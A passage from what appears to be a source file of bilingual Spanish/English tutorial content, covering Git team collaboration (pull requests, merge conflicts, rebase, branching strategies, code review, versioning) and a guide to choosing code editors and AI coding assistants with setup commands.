- 🎥 [Git in 15 minutes (video)](https://www.youtube.com/watch?v=USjZcfj8yxE)
    `,
  },
  'git-advanced': {
    contentEs: `
## Colaboración profesional con Git

Ya sabes usar Git solo. Ahora aprende a trabajar en equipo sin pisarte con otros developers.

---

## 🔀 Pull Requests (PRs)

Un PR es una solicitud para integrar tus cambios a la rama principal. Es el corazón de la colaboración.

### Flujo de trabajo con PRs

\`\`\`bash
# 1. Crea una rama para tu feature
git checkout -b feature/nueva-funcionalidad

# 2. Trabaja y haz commits
git add .
git commit -m "Agrega formulario de contacto"

# 3. Sube tu rama
git push -u origin feature/nueva-funcionalidad

# 4. Crea el PR en GitHub
gh pr create --fill
# O ve a GitHub y haz clic en "Compare & pull request"
\`\`\`

### Anatomía de un buen PR

| Elemento | Qué incluir |
|----------|-------------|
| **Título** | Descripción clara y concisa |
| **Descripción** | Qué hace, por qué, cómo probarlo |
| **Screenshots** | Si hay cambios visuales |
| **Tests** | Que pasen todos |
| **Tamaño** | Pequeño (< 400 líneas ideal) |

### Ejemplo de descripción de PR

\`\`\`markdown
## ¿Qué hace este PR?
Agrega formulario de contacto con validación.

## ¿Por qué?
Los usuarios necesitan poder contactarnos (#123)

## ¿Cómo probarlo?
1. Ir a /contacto
2. Llenar el formulario
3. Verificar que llegue el email

## Screenshots
[imagen del formulario]

## Checklist
- [x] Tests pasan
- [x] Sin console.logs
- [x] Responsive
\`\`\`

---

## ⚔️ Merge Conflicts

Ocurren cuando dos personas modifican las mismas líneas. No entres en pánico.

### ¿Cómo se ven?

\`\`\`javascript
<<<<<<< HEAD
const mensaje = "Versión de main";
=======
const mensaje = "Tu versión";
>>>>>>> feature/mi-rama
\`\`\`

### Cómo resolverlos

\`\`\`bash
# 1. Actualiza tu rama con main
git checkout feature/mi-rama
git fetch origin
git merge origin/main
# Aquí aparecen los conflictos

# 2. Abre los archivos con conflictos
# VS Code los marca en rojo/verde

# 3. Decide qué código mantener
# Elimina los marcadores <<<<, ====, >>>>

# 4. Marca como resuelto
git add archivo-con-conflicto.js
git commit -m "Resuelve conflictos con main"
git push
\`\`\`

### Tips para evitar conflictos

| Práctica | Por qué ayuda |
|----------|---------------|
| PRs pequeños | Menos código = menos conflictos |
| Merge main frecuente | Detectas conflictos temprano |
| Comunicación | "Voy a modificar X" en el chat |
| Archivos separados | Cada quien en su zona |

---

## 🔄 Rebase vs Merge

Dos formas de integrar cambios. Ambas válidas, diferentes usos.

### Merge (conserva historial)

\`\`\`bash
git checkout main
git merge feature/mi-rama
\`\`\`

\`\`\`
      A---B---C feature
     /         \\
D---E---F---G---H main (merge commit)
\`\`\`

### Rebase (historial lineal)

\`\`\`bash
git checkout feature/mi-rama
git rebase main
git checkout main
git merge feature/mi-rama  # Fast-forward
\`\`\`

\`\`\`
D---E---F---G---A'---B'---C' main
\`\`\`

### ¿Cuándo usar cada uno?

| Situación | Usa |
|-----------|-----|
| PR a main | Merge (o Squash) |
| Actualizar tu rama con main | Rebase |
| Rama compartida con otros | Merge (nunca rebase) |
| Historial limpio | Rebase + Squash |

> ⚠️ **Regla de oro**: Nunca hagas rebase de ramas que otros están usando.

---

## 👥 Estrategias de branching

### GitHub Flow (simple, recomendado)

\`\`\`
main ────●────●────●────●────●────
          \\      /   \\      /
           ●────●     ●────●
          feature    feature
\`\`\`

- \`main\` siempre deployable
- Features en ramas cortas
- PRs para todo
- Deploy después de merge

### GitFlow (empresas grandes)

\`\`\`
main     ────────────●────────────●────
                    /            /
release  ──────●───●────────●───●────
              /   /        /   /
develop ●───●───●───●───●───●───●────
         \\     /     \\     /
          ●───●       ●───●
         feature     feature
\`\`\`

- Más complejo, más control
- Ramas: main, develop, feature, release, hotfix
- Para releases planificados

### Trunk-Based (equipos expertos)

\`\`\`
main ●───●───●───●───●───●───●───●
      \\─/     \\─/     \\─/
      tiny    tiny    tiny
\`\`\`

- Commits directos a main (o PRs muy pequeños)
- Feature flags para código incompleto
- CI/CD robusto obligatorio

---

## 🔍 Code Review

Revisar código de otros es tan importante como escribirlo.

### Como autor del PR

\`\`\`bash
# Antes de pedir review
git diff main...HEAD  # Revisa tus cambios
npm test              # Asegura que pasan tests
npm run lint          # Sin errores de estilo
\`\`\`

### Como reviewer

| Busca | Ejemplo |
|-------|---------|
| **Bugs** | ¿Maneja errores? ¿Edge cases? |
| **Seguridad** | ¿Inyección SQL? ¿XSS? ¿Secrets? |
| **Rendimiento** | ¿N+1 queries? ¿Loops innecesarios? |
| **Legibilidad** | ¿Se entiende sin explicación? |
| **Tests** | ¿Cubren los casos importantes? |

### Cómo dar feedback constructivo

\`\`\`markdown
❌ "Esto está mal"
✅ "Considera usar Optional Chaining aquí para evitar
    el error si user es undefined: user?.name"

❌ "No me gusta"
✅ "Prefiero extraer esta lógica a una función separada
    para mejorar testabilidad. ¿Qué opinas?"
\`\`\`

---

## 🏷️ Versionado Semántico

Cómo numerar releases: MAJOR.MINOR.PATCH

| Versión | Cuándo incrementar |
|---------|-------------------|
| **MAJOR** (2.0.0) | Cambios que rompen compatibilidad |
| **MINOR** (1.1.0) | Nueva funcionalidad, compatible |
| **PATCH** (1.0.1) | Bug fixes |

\`\`\`bash
# Crear un tag de versión
git tag -a v1.2.0 -m "Release 1.2.0: Agrega autenticación"
git push origin v1.2.0

# Ver tags
git tag -l

# Crear release en GitHub
gh release create v1.2.0 --notes "Changelog aquí"
\`\`\`

---

## 🛠️ Comandos avanzados útiles

\`\`\`bash
# Squash: Unir últimos 3 commits en uno
git rebase -i HEAD~3
# Cambia "pick" por "squash" en los commits a unir

# Cherry-pick: Traer un commit específico
git cherry-pick abc123

# Stash: Guardar cambios temporalmente
git stash
git stash pop

# Bisect: Encontrar qué commit introdujo un bug
git bisect start
git bisect bad                 # Commit actual tiene bug
git bisect good v1.0.0         # Esta versión estaba bien
# Git te va guiando hasta encontrar el culpable

# Reflog: Recuperar commits "perdidos"
git reflog
git checkout HEAD@{2}

# Clean: Eliminar archivos no rastreados
git clean -fd
\`\`\`

---

## 📋 Checklist de colaboración

- [ ] Rama con nombre descriptivo (\`feature/\`, \`fix/\`, \`hotfix/\`)
- [ ] Commits atómicos con mensajes claros
- [ ] PR con descripción completa
- [ ] Tests pasan en CI
- [ ] Code review aprobado
- [ ] Sin conflictos con main
- [ ] Squash o merge según convención del equipo

---

## 🍳 Practica

→ **[Contribuir a Open Source](/es/cooking/open-source-contrib)** — Tu primer PR a un proyecto real

---

## Enlaces útiles

- 📖 [GitHub Flow](https://docs.github.com/en/get-started/quickstart/github-flow)
- 📖 [Conventional Commits](https://www.conventionalcommits.org/)
- 📖 [Semantic Versioning](https://semver.org/)
- 🎓 [Learn Git Branching](https://learngitbranching.js.org/)
    `,
    contentEn: `
## Professional collaboration with Git

You know how to use Git alone. Now learn to work in a team without stepping on other developers' toes.

---

## 🔀 Pull Requests (PRs)

A PR is a request to integrate your changes into the main branch. It's the heart of collaboration.

### PR workflow

\`\`\`bash
# 1. Create a branch for your feature
git checkout -b feature/new-functionality

# 2. Work and make commits
git add .
git commit -m "Add contact form"

# 3. Push your branch
git push -u origin feature/new-functionality

# 4. Create the PR on GitHub
gh pr create --fill
# Or go to GitHub and click "Compare & pull request"
\`\`\`

### Anatomy of a good PR

| Element | What to include |
|---------|-----------------|
| **Title** | Clear and concise description |
| **Description** | What it does, why, how to test |
| **Screenshots** | If there are visual changes |
| **Tests** | All passing |
| **Size** | Small (< 400 lines ideal) |

### PR description example

\`\`\`markdown
## What does this PR do?
Adds contact form with validation.

## Why?
Users need to be able to contact us (#123)

## How to test?
1. Go to /contact
2. Fill out the form
3. Verify the email arrives

## Screenshots
[form image]

## Checklist
- [x] Tests pass
- [x] No console.logs
- [x] Responsive
\`\`\`

---

## ⚔️ Merge Conflicts

They happen when two people modify the same lines. Don't panic.

### What they look like

\`\`\`javascript
<<<<<<< HEAD
const message = "Main version";
=======
const message = "Your version";
>>>>>>> feature/my-branch
\`\`\`

### How to resolve them

\`\`\`bash
# 1. Update your branch with main
git checkout feature/my-branch
git fetch origin
git merge origin/main
# Conflicts appear here

# 2. Open files with conflicts
# VS Code marks them in red/green

# 3. Decide which code to keep
# Remove the <<<<, ====, >>>> markers

# 4. Mark as resolved
git add file-with-conflict.js
git commit -m "Resolve conflicts with main"
git push
\`\`\`

### Tips to avoid conflicts

| Practice | Why it helps |
|----------|--------------|
| Small PRs | Less code = fewer conflicts |
| Merge main frequently | Detect conflicts early |
| Communication | "I'm modifying X" in chat |
| Separate files | Everyone in their zone |

---

## 🔄 Rebase vs Merge

Two ways to integrate changes. Both valid, different uses.

### Merge (preserves history)

\`\`\`bash
git checkout main
git merge feature/my-branch
\`\`\`

\`\`\`
      A---B---C feature
     /         \\
D---E---F---G---H main (merge commit)
\`\`\`

### Rebase (linear history)

\`\`\`bash
git checkout feature/my-branch
git rebase main
git checkout main
git merge feature/my-branch  # Fast-forward
\`\`\`

\`\`\`
D---E---F---G---A'---B'---C' main
\`\`\`

### When to use each?

| Situation | Use |
|-----------|-----|
| PR to main | Merge (or Squash) |
| Update your branch with main | Rebase |
| Shared branch with others | Merge (never rebase) |
| Clean history | Rebase + Squash |

> ⚠️ **Golden rule**: Never rebase branches that others are using.

---

## 👥 Branching strategies

### GitHub Flow (simple, recommended)

\`\`\`
main ────●────●────●────●────●────
          \\      /   \\      /
           ●────●     ●────●
          feature    feature
\`\`\`

- \`main\` always deployable
- Features in short-lived branches
- PRs for everything
- Deploy after merge

### GitFlow (large enterprises)

\`\`\`
main     ────────────●────────────●────
                    /            /
release  ──────●───●────────●───●────
              /   /        /   /
develop ●───●───●───●───●───●───●────
         \\     /     \\     /
          ●───●       ●───●
         feature     feature
\`\`\`

- More complex, more control
- Branches: main, develop, feature, release, hotfix
- For planned releases

### Trunk-Based (expert teams)

\`\`\`
main ●───●───●───●───●───●───●───●
      \\─/     \\─/     \\─/
      tiny    tiny    tiny
\`\`\`

- Direct commits to main (or very small PRs)
- Feature flags for incomplete code
- Robust CI/CD required

---

## 🔍 Code Review

Reviewing others' code is as important as writing it.

### As PR author

\`\`\`bash
# Before requesting review
git diff main...HEAD  # Review your changes
npm test              # Ensure tests pass
npm run lint          # No style errors
\`\`\`

### As reviewer

| Look for | Example |
|----------|---------|
| **Bugs** | Does it handle errors? Edge cases? |
| **Security** | SQL injection? XSS? Secrets? |
| **Performance** | N+1 queries? Unnecessary loops? |
| **Readability** | Understandable without explanation? |
| **Tests** | Cover important cases? |

### How to give constructive feedback

\`\`\`markdown
❌ "This is wrong"
✅ "Consider using Optional Chaining here to avoid
    the error if user is undefined: user?.name"

❌ "I don't like it"
✅ "I'd prefer extracting this logic to a separate function
    to improve testability. What do you think?"
\`\`\`

---

## 🏷️ Semantic Versioning

How to number releases: MAJOR.MINOR.PATCH

| Version | When to increment |
|---------|-------------------|
| **MAJOR** (2.0.0) | Breaking changes |
| **MINOR** (1.1.0) | New functionality, compatible |
| **PATCH** (1.0.1) | Bug fixes |

\`\`\`bash
# Create a version tag
git tag -a v1.2.0 -m "Release 1.2.0: Add authentication"
git push origin v1.2.0

# List tags
git tag -l

# Create GitHub release
gh release create v1.2.0 --notes "Changelog here"
\`\`\`

---

## 🛠️ Useful advanced commands

\`\`\`bash
# Squash: Combine last 3 commits into one
git rebase -i HEAD~3
# Change "pick" to "squash" on commits to combine

# Cherry-pick: Bring a specific commit
git cherry-pick abc123

# Stash: Save changes temporarily
git stash
git stash pop

# Bisect: Find which commit introduced a bug
git bisect start
git bisect bad                 # Current commit has bug
git bisect good v1.0.0         # This version was fine
# Git guides you until finding the culprit

# Reflog: Recover "lost" commits
git reflog
git checkout HEAD@{2}

# Clean: Remove untracked files
git clean -fd
\`\`\`

---

## 📋 Collaboration checklist

- [ ] Branch with descriptive name (\`feature/\`, \`fix/\`, \`hotfix/\`)
- [ ] Atomic commits with clear messages
- [ ] PR with complete description
- [ ] Tests pass in CI
- [ ] Code review approved
- [ ] No conflicts with main
- [ ] Squash or merge per team convention

---

## 🍳 Practice

→ **[Contribute to Open Source](/en/cooking/open-source-contrib)** — Your first PR to a real project

---

## Useful links

- 📖 [GitHub Flow](https://docs.github.com/en/get-started/quickstart/github-flow)
- 📖 [Conventional Commits](https://www.conventionalcommits.org/)
- 📖 [Semantic Versioning](https://semver.org/)
- 🎓 [Learn Git Branching](https://learngitbranching.js.org/)
    `,
  },
  editors: {
    contentEs: `
## ¿Qué herramienta necesito?

El ecosistema de desarrollo en 2026 tiene dos componentes que debes entender:
1. **El editor** → donde escribes código (VS Code, Neovim, etc.)
2. **La IA** → que te ayuda a escribir mejor y más rápido

Puedes combinarlos de distintas formas. Esta guía te ayuda a elegir.

---

## Decisión rápida: ¿Qué debería usar?

\`\`\`
                    ¿Qué buscas?
                         │
         ┌───────────────┼───────────────┐
         ▼               ▼               ▼
    Simplicidad     Máximo poder    Gratis total
         │               │               │
         ▼               ▼               ▼
┌─────────────┐  ┌─────────────┐  ┌─────────────┐
│   CURSOR    │  │  VS Code +  │  │  VS Code +  │
│  (todo en   │  │ Claude Code │  │  Continue + │
│    uno)     │  │   (CLI)     │  │   Ollama    │
│             │  │             │  │             │
│  $20/mes    │  │  ~$20/mes   │  │    $0       │
└─────────────┘  └─────────────┘  └─────────────┘
\`\`\`

> **¿Eres principiante?** Empieza con VS Code + GitHub Copilot ($10/mes o gratis para estudiantes).

---

## Parte 1: Los Editores Base

El editor es donde vives. Elige uno y apréndelo bien.

| Editor | Precio | Mejor para | Curva de aprendizaje |
|--------|--------|------------|---------------------|
| **VS Code** | Gratis | La mayoría | ⭐ Fácil |
| **Cursor** | $20/mes | IA integrada | ⭐ Fácil (es VS Code) |
| **Zed** | Gratis | Velocidad extrema | ⭐⭐ Media |
| **Neovim** | Gratis | Terminal puro | ⭐⭐⭐ Difícil |
| **JetBrains** | $15-25/mes | Java, Android, proyectos grandes | ⭐⭐ Media |

### Instalación rápida

\`\`\`bash
# macOS
brew install --cask visual-studio-code  # VS Code
brew install --cask cursor              # Cursor
brew install neovim                     # Neovim

# Windows
winget install Microsoft.VisualStudioCode
winget install Cursor.Cursor
\`\`\`

---

## Parte 2: Las 3 Formas de Agregar IA

Una vez tienes tu editor, puedes agregar IA de 3 formas distintas:

\`\`\`
┌─────────────────────────────────────────────────────────────────┐
│                     FORMAS DE AGREGAR IA                        │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  1. EXTENSIONES          2. EDITOR CON IA      3. CLI AGÉNTICA │
│     (se instalan)           (ya viene)            (terminal)   │
│                                                                 │
│  ┌─────────────┐        ┌─────────────┐       ┌─────────────┐  │
│  │ • Copilot   │        │ • Cursor    │       │ • Claude    │  │
│  │ • Cody      │        │ • Windsurf  │       │   Code      │  │
│  │ • Continue  │        │ • Antigrav. │       │ • Aider     │  │
│  │ • Gemini    │        │ • IDX       │       │ • Codex CLI │  │
│  └─────────────┘        └─────────────┘       └─────────────┘  │
│                                                                 │
│  Autocompletado ✓        Todo integrado ✓      Ejecuta cmds ✓  │
│  Usa tu editor ✓         Cambias editor ✗      Multi-archivo ✓ │
│  Chat básico ✓           IA profunda ✓         Modo agente ✓   │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
\`\`\`

---

### Opción 1: Extensiones de IA

Se instalan en tu editor existente. Ideal si ya usas VS Code o JetBrains.

| Extensión | Precio | Lo mejor | Lo peor |
|-----------|--------|----------|---------|
| **GitHub Copilot** | $10/mes | Autocompletado excelente | Contexto limitado |
| **Cody** | Gratis (500 msgs) | Entiende codebases enormes | Menos autonomía |
| **Continue** | Gratis + API | Usa cualquier modelo | Requiere configurar |
| **Gemini Code Assist** | Gratis (6000/mes) | Integra con Google Cloud | Enterprise-focused |

**Setup: VS Code + Copilot (5 min)**
\`\`\`bash
# 1. Instalar extensión
code --install-extension GitHub.copilot

# 2. Hacer login en GitHub cuando te lo pida

# 3. Listo - escribe código y verás sugerencias
\`\`\`

---

### Opción 2: Editores con IA Nativa

El editor YA incluye IA. No configuras nada.

| Editor | Precio | Lo mejor | Lo peor |
|--------|--------|----------|---------|
| **Cursor** | $20/mes | UX perfecta, Composer multi-archivo | Otro editor que aprender |
| **Windsurf** | $15/mes | Cascade (agente propio) | Menos maduro |
| **Antigravity** | Gratis (preview) | Multi-agente paralelo | Muy nuevo (Nov 2025) |
| **Google IDX** | Gratis (beta) | 100% cloud, no instalas nada | Requiere internet |

**Setup: Cursor (2 min)**
\`\`\`bash
# macOS
brew install --cask cursor

# Abrir y hacer login - listo
\`\`\`

---

### Opción 3: CLI Agéntica (Terminal)

Herramientas que viven en tu terminal y pueden ejecutar comandos, editar múltiples archivos, y resolver tareas complejas de forma autónoma.

| CLI | Precio | Lo mejor | Lo peor |
|-----|--------|----------|---------|
| **Claude Code** | ~$20/mes | Modo agente, 200K contexto | Sin autocompletado |
| **Aider** | Gratis + API | Open source, cualquier modelo | Solo terminal |
| **Codex CLI** | Gratis + API | Integrado con OpenAI | Nuevo (Abril 2025) |

**Setup: Claude Code (3 min)**
\`\`\`bash
# 1. Instalar
npm install -g @anthropic-ai/claude-code

# 2. Configurar API key
export ANTHROPIC_API_KEY=sk-ant-...

# 3. Usar en cualquier proyecto
cd mi-proyecto
claude
\`\`\`

---

## Parte 3: Combinaciones Recomendadas por Perfil

### 🎓 Principiante ($10/mes)
\`\`\`
VS Code + GitHub Copilot
└── Autocompletado te enseña patrones mientras escribes
└── Copilot Chat para preguntas básicas
\`\`\`

### 💼 Desarrollador Profesional ($20-40/mes)
\`\`\`
Cursor (editor principal)
   └── Composer para refactors multi-archivo
   └── Cmd+K para ediciones inline rápidas

+ Claude Code (terminal)
   └── Tareas complejas: "implementa auth completa"
   └── Debugging profundo con contexto de proyecto
\`\`\`

### 🆓 Presupuesto Cero ($0)
\`\`\`
VS Code + Continue (extensión open source)
   └── Conecta a Ollama para modelos locales
   └── Autocompletado gratuito con llama3

+ Aider (terminal)
   └── Usa Ollama o APIs con créditos gratuitos
\`\`\`

### 🏢 Enterprise
\`\`\`
VS Code + Cody (contexto masivo)
   └── Entiende millones de líneas de código
   └── Integración con Sourcegraph

+ Gemini Code Assist (si usas Google Cloud)
\`\`\`

---

## Parte 4: Comparativa de Capacidades (Enero 2026)

| Capacidad | Copilot | Cursor | Claude Code | Antigravity |
|-----------|:-------:|:------:|:-----------:|:-----------:|
| Autocompletado inline | ✅✅ | ✅✅ | ❌ | ✅ |
| Chat contextual | ✅ | ✅✅ | ✅✅ | ✅✅ |
| Edición multi-archivo | ❌ | ✅✅ | ✅✅ | ✅✅ |
| Ejecutar comandos | ❌ | ✅ | ✅✅ | ✅✅ |
| Modo agente autónomo | ❌ | ✅ | ✅✅ | ✅✅ |
| Multi-agente paralelo | ❌ | ❌ | ❌ | ✅✅ |
| Funciona offline | ❌ | ❌ | ❌ | ❌ |

\`\`\`
Leyenda: ✅✅ Excelente | ✅ Bueno | ❌ No disponible
\`\`\`

---

## Parte 5: Setup Esencial de VS Code

Si usas VS Code (solo o con extensiones de IA), estas son las configuraciones esenciales:

### Extensiones imprescindibles
\`\`\`bash
code --install-extension dbaeumer.vscode-eslint
code --install-extension esbenp.prettier-vscode
code --install-extension eamodio.gitlens
code --install-extension usernamehw.errorlens
\`\`\`

### settings.json recomendado
\`\`\`json
{
  "editor.formatOnSave": true,
  "editor.defaultFormatter": "esbenp.prettier-vscode",
  "editor.tabSize": 2,
  "editor.fontSize": 14,
  "editor.minimap.enabled": false,
  "editor.wordWrap": "on",
  "editor.bracketPairColorization.enabled": true,
  "files.autoSave": "onFocusChange"
}
\`\`\`

### Atajos que debes memorizar

| Acción | macOS | Windows/Linux |
|--------|-------|---------------|
| Paleta comandos | \`Cmd+Shift+P\` | \`Ctrl+Shift+P\` |
| Buscar archivo | \`Cmd+P\` | \`Ctrl+P\` |
| Buscar en proyecto | \`Cmd+Shift+F\` | \`Ctrl+Shift+F\` |
| Terminal integrada | \`Cmd+J\` | \`Ctrl+J\` |
| Multi-cursor | \`Cmd+D\` | \`Ctrl+D\` |
| Ir a definición | \`Cmd+Click\` | \`Ctrl+Click\` |
| Renombrar símbolo | \`F2\` | \`F2\` |

---

## Resumen: Mi recomendación 2026

\`\`\`
┌────────────────────────────────────────────────────────────┐
│                                                            │
│   Si estás empezando:    VS Code + Copilot ($10/mes)      │
│                                                            │
│   Si quieres productividad máxima:                        │
│                          Cursor + Claude Code (~$40/mes)   │
│                                                            │
│   Si quieres $0:         VS Code + Continue + Ollama      │
│                                                            │
└────────────────────────────────────────────────────────────┘
\`\`\`

Las herramientas de IA **se complementan**. No tienes que elegir solo una.

---

## Practica

→ [Introducción a Claude Code](/es/cooking/claude-code-intro) — Instala y usa Claude Code

---

## Enlaces útiles

**Editores:**
- ⌨️ [VS Code](https://code.visualstudio.com) - Microsoft (Gratis)
- ⚡ [Cursor](https://cursor.sh) - Editor con IA nativa
- 🚀 [Zed](https://zed.dev) - Editor ultrarrápido

**Extensiones de IA:**
- 🐙 [GitHub Copilot](https://github.com/features/copilot) - Microsoft
- 🔍 [Cody](https://sourcegraph.com/cody) - Sourcegraph
- 🔓 [Continue](https://continue.dev) - Open Source

**CLIs Agénticas:**
- 🤖 [Claude Code](https://docs.anthropic.com/en/docs/claude-code) - Anthropic
- 🔧 [Aider](https://aider.chat) - Open Source
- ⚡ [Codex CLI](https://openai.com/index/introducing-codex) - OpenAI

**Editores con IA:**
- 🌊 [Windsurf](https://codeium.com/windsurf) - Codeium
- 🚀 [Google Antigravity](https://idx.google.com/antigravity) - Google
- 🌐 [Google IDX](https://idx.dev) - IDE en la nube
    `,
    contentEn: `
## What tool do I need?

The development ecosystem in 2026 has two components you need to understand:
1. **The editor** → where you write code (VS Code, Neovim, etc.)
2. **The AI** → that helps you write better and faster

You can combine them in different ways. This guide helps you choose.

---

## Quick Decision: What should I use?

\`\`\`
                    What are you looking for?
                              │
              ┌───────────────┼───────────────┐
              ▼               ▼               ▼
         Simplicity     Maximum power    Totally free
              │               │               │
              ▼               ▼               ▼
     ┌─────────────┐  ┌─────────────┐  ┌─────────────┐
     │   CURSOR    │  │  VS Code +  │  │  VS Code +  │
     │  (all in    │  │ Claude Code │  │  Continue + │
     │    one)     │  │   (CLI)     │  │   Ollama    │
     │             │  │             │  │             │
     │  $20/mo     │  │  ~$20/mo    │  │    $0       │
     └─────────────┘  └─────────────┘  └─────────────┘
\`\`\`

> **Are you a beginner?** Start with VS Code + GitHub Copilot ($10/mo or free for students).

---

## Part 1: Base Editors

The editor is where you live. Pick one and learn it well.

| Editor | Price | Best for | Learning curve |
|--------|-------|----------|----------------|
| **VS Code** | Free | Most people | ⭐ Easy |
| **Cursor** | $20/mo | Integrated AI | ⭐ Easy (it's VS Code) |
| **Zed** | Free | Extreme speed | ⭐⭐ Medium |
| **Neovim** | Free | Pure terminal | ⭐⭐⭐ Hard |
| **JetBrains** | $15-25/mo | Java, Android, large projects | ⭐⭐ Medium |

### Quick Installation

\`\`\`bash
# macOS
brew install --cask visual-studio-code  # VS Code
brew install --cask cursor              # Cursor
brew install neovim                     # Neovim

# Windows
winget install Microsoft.VisualStudioCode
winget install Cursor.Cursor
\`\`\`

---

## Part 2: The 3 Ways to Add AI

Once you have your editor, you can add AI in 3 different ways:

\`\`\`
┌─────────────────────────────────────────────────────────────────┐
│                      WAYS TO ADD AI                              │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  1. EXTENSIONS          2. AI EDITOR         3. AGENTIC CLI     │
│     (install them)         (built-in)           (terminal)      │
│                                                                  │
│  ┌─────────────┐        ┌─────────────┐       ┌─────────────┐   │
│  │ • Copilot   │        │ • Cursor    │       │ • Claude    │   │
│  │ • Cody      │        │ • Windsurf  │       │   Code      │   │
│  │ • Continue  │        │ • Antigrav. │       │ • Aider     │   │
│  │ • Gemini    │        │ • IDX       │       │ • Codex CLI │   │
│  └─────────────┘        └─────────────┘       └─────────────┘   │
│                                                                  │
│  Autocomplete ✓          All integrated ✓     Runs commands ✓   │
│  Use your editor ✓       Change editor ✗      Multi-file ✓      │
│  Basic chat ✓            Deep AI ✓            Agent mode ✓      │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
\`\`\`

---

### Option 1: AI Extensions

Install on your existing editor. Ideal if you already use VS Code or JetBrains.

| Extension | Price | Best thing | Worst thing |
|-----------|-------|------------|-------------|
| **GitHub Copilot** | $10/mo | Excellent autocomplete | Limited context |
| **Cody** | Free (500 msgs) | Understands huge codebases | Less autonomy |
| **Continue** | Free + API | Uses any model | Requires setup |
| **Gemini Code Assist** | Free (6000/mo) | Integrates with Google Cloud | Enterprise-focused |

**Setup: VS Code + Copilot (5 min)**
\`\`\`bash
# 1. Install extension
code --install-extension GitHub.copilot

# 2. Login to GitHub when prompted

# 3. Done - write code and you'll see suggestions
\`\`\`

---

### Option 2: Editors with Native AI

The editor ALREADY includes AI. Nothing to configure.

| Editor | Price | Best thing | Worst thing |
|--------|-------|------------|-------------|
| **Cursor** | $20/mo | Perfect UX, Composer multi-file | Another editor to learn |
| **Windsurf** | $15/mo | Cascade (own agent) | Less mature |
| **Antigravity** | Free (preview) | Parallel multi-agent | Very new (Nov 2025) |
| **Google IDX** | Free (beta) | 100% cloud, nothing to install | Requires internet |

**Setup: Cursor (2 min)**
\`\`\`bash
# macOS
brew install --cask cursor

# Open and login - done
\`\`\`

---

### Option 3: Agentic CLI (Terminal)

Tools that live in your terminal and can execute commands, edit multiple files, and solve complex tasks autonomously.

| CLI | Price | Best thing | Worst thing |
|-----|-------|------------|-------------|
| **Claude Code** | ~$20/mo | Agent mode, 200K context | No autocomplete |
| **Aider** | Free + API | Open source, any model | Terminal only |
| **Codex CLI** | Free + API | Integrated with OpenAI | New (April 2025) |

**Setup: Claude Code (3 min)**
\`\`\`bash
# 1. Install
npm install -g @anthropic-ai/claude-code

# 2. Set API key
export ANTHROPIC_API_KEY=sk-ant-...

# 3. Use in any project
cd my-project
claude
\`\`\`

---

## Part 3: Recommended Combinations by Profile

### 🎓 Beginner ($10/mo)
\`\`\`
VS Code + GitHub Copilot
└── Autocomplete teaches you patterns as you type
└── Copilot Chat for basic questions
\`\`\`

### 💼 Professional Developer ($20-40/mo)
\`\`\`
Cursor (main editor)
   └── Composer for multi-file refactors
   └── Cmd+K for quick inline edits

+ Claude Code (terminal)
   └── Complex tasks: "implement complete auth"
   └── Deep debugging with project context
\`\`\`

### 🆓 Zero Budget ($0)
\`\`\`
VS Code + Continue (open source extension)
   └── Connect to Ollama for local models
   └── Free autocomplete with llama3

+ Aider (terminal)
   └── Use Ollama or APIs with free credits
\`\`\`

### 🏢 Enterprise
\`\`\`
VS Code + Cody (massive context)
   └── Understands millions of lines of code
   └── Integration with Sourcegraph

+ Gemini Code Assist (if you use Google Cloud)
\`\`\`

---

## Part 4: Capabilities Comparison (January 2026)

| Capability | Copilot | Cursor | Claude Code | Antigravity |
|------------|:-------:|:------:|:-----------:|:-----------:|
| Inline autocomplete | ✅✅ | ✅✅ | ❌ | ✅ |
| Contextual chat | ✅ | ✅✅ | ✅✅ | ✅✅ |
| Multi-file editing | ❌ | ✅✅ | ✅✅ | ✅✅ |
| Execute commands | ❌ | ✅ | ✅✅ | ✅✅ |
| Autonomous agent mode | ❌ | ✅ | ✅✅ | ✅✅ |
| Parallel multi-agent | ❌ | ❌ | ❌ | ✅✅ |
| Works offline | ❌ | ❌ | ❌ | ❌ |

\`\`\`
Legend: ✅✅ Excellent | ✅ Good | ❌ Not available
\`\`\`

---

## Part 5: Essential VS Code Setup

If you use VS Code (alone or with AI extensions), these are the essential settings:

### Must-have extensions
\`\`\`bash
code --install-extension dbaeumer.vscode-eslint
code --install-extension esbenp.prettier-vscode
code --install-extension eamodio.gitlens
code --install-extension usernamehw.errorlens
\`\`\`

### Recommended settings.json
\`\`\`json
{
  "editor.formatOnSave": true,
  "editor.defaultFormatter": "esbenp.prettier-vscode",
  "editor.tabSize": 2,
  "editor.fontSize": 14,
  "editor.minimap.enabled": false,
  "editor.wordWrap": "on",
  "editor.bracketPairColorization.enabled": true,
  "files.autoSave": "onFocusChange"
}
\`\`\`

### Shortcuts you must memorize

| Action | macOS | Windows/Linux |
|--------|-------|---------------|
| Command palette | \`Cmd+Shift+P\` | \`Ctrl+Shift+P\` |
| Find file | \`Cmd+P\` | \`Ctrl+P\` |
| Search in project | \`Cmd+Shift+F\` | \`Ctrl+Shift+F\` |
| Integrated terminal | \`Cmd+J\` | \`Ctrl+J\` |
| Multi-cursor | \`Cmd+D\` | \`Ctrl+D\` |
| Go to definition | \`Cmd+Click\` | \`Ctrl+Click\` |
| Rename symbol | \`F2\` | \`F2\` |

---

## Summary: My 2026 Recommendation

\`\`\`
┌────────────────────────────────────────────────────────────┐
│                                                            │
│   If you're starting:    VS Code + Copilot ($10/mo)       │
│                                                            │
│   If you want max productivity:                           │
│                          Cursor + Claude Code (~$40/mo)    │
│                                                            │
│   If you want $0:        VS Code + Continue + Ollama      │
│                                                            │
└────────────────────────────────────────────────────────────┘
\`\`\`

AI tools **complement each other**. You don't have to choose just one.

---

## Practice

→ [Introduction to Claude Code](/en/cooking/claude-code-intro) — Install and use Claude Code

---

## Useful Links

**Editors:**
- ⌨️ [VS Code](https://code.visualstudio.com) - Microsoft (Free)
- ⚡ [Cursor](https://cursor.sh) - Editor with native AI
- 🚀 [Zed](https://zed.dev) - Ultrafast editor

**AI Extensions:**
- 🐙 [GitHub Copilot](https://github.com/features/copilot) - Microsoft
- 🔍 [Cody](https://sourcegraph.com/cody) - Sourcegraph
- 🔓 [Continue](https://continue.dev) - Open Source

**Agentic CLIs:**
- 🤖 [Claude Code](https://docs.anthropic.com/en/docs/claude-code) - Anthropic
- 🔧 [Aider](https://aider.chat) - Open Source
